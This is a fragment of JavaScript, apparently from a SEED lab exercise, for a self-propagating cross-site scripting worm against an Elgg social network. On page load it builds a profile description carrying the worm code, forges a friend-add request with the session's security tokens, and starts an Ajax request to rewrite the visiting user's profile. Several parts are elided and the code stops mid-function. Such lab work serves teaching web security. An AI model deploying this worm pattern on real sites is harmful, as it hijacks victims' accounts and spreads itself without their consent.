...
window.onload = function(){
  ...
  var desc = "&description=Samy is my HERO (added by Thunga Geethika)" + wormCode;
  ...
  var sendgeturl= "http://www.seed-server.com/action/friends/add" + "?friend=56" + token + ts;
  var content = token + ts + name + desc + guid;
  
  //Construct and send the Ajax request
  if (elgg.session.user.guid != 56){
    //modify profile
    var Ajax=null;
